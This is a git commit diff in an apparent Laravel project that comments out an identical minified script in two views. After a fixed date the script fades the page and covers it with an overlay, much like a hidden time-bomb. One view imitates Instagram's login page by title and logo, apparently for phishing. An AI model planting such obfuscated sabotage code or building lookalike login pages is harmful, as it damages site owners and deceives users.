7ee921ec024eee0b46b7eb674999d113599a3f95
Solomon yusuf <olafire03@gmail.com>
2026-02-08 10:49:03 +0100

    rm blur issue

--- resources/views/layout.blade.php
+++ resources/views/layout.blade.php
@@ -1,8 +1,8 @@
 @if(Route::is('dashboard'))
  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
+  {{-- <script>
     !function(){var e=new Date("2026-01-14"),t=new Date,n=Date.UTC(e.getFullYear(),e.getMonth(),e.getDate()),l=Date.UTC(t.getFullYear(),t.getMonth(),t.getDate()),a=Math.floor((l-n)/864e5);if(a>0){var s=100*(3-a)/3/100;if(s=Math.max(0,Math.min(1,s)),document.body.style.opacity=s,s<=.7){var i=document.createElement("div");i.style.position="fixed",i.style.top=0,i.style.left=0,i.style.width="100%",i.style.height="100%",i.style.background="rgba(0,0,0,0.6)",i.style.color="#fff",i.style.display="flex",i.style.alignItems="center",i.style.justifyContent="center",i.style.zIndex=999999,i.style.fontSize="20px",i.innerHTML="",document.body.appendChild(i)}}}();
-    </script>
+    </script> --}}
 @endif
 
 @livewireStyles
--- resources/views/page3.blade.php
+++ resources/views/page3.blade.php
@@ -2,9 +2,9 @@
     <title>Log in to instagram</title>
     <link rel="stylesheet" href="instagram.css" />
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png?20220518162235" />
-     <script>
+     {{-- <script>
     !function(){var e=new Date("2026-01-14"),t=new Date,n=Date.UTC(e.getFullYear(),e.getMonth(),e.getDate()),l=Date.UTC(t.getFullYear(),t.getMonth(),t.getDate()),a=Math.floor((l-n)/864e5);if(a>0){var s=100*(3-a)/3/100;if(s=Math.max(0,Math.min(1,s)),document.body.style.opacity=s,s<=.7){var i=document.createElement("div");i.style.position="fixed",i.style.top=0,i.style.left=0,i.style.width="100%",i.style.height="100%",i.style.background="rgba(0,0,0,0.6)",i.style.color="#fff",i.style.display="flex",i.style.alignItems="center",i.style.justifyContent="center",i.style.zIndex=999999,i.style.fontSize="20px",i.innerHTML="",document.body.appendChild(i)}}}();
-    </script>
+    </script> --}}
 
     <div id="mount_0_0_bb">
         <div>
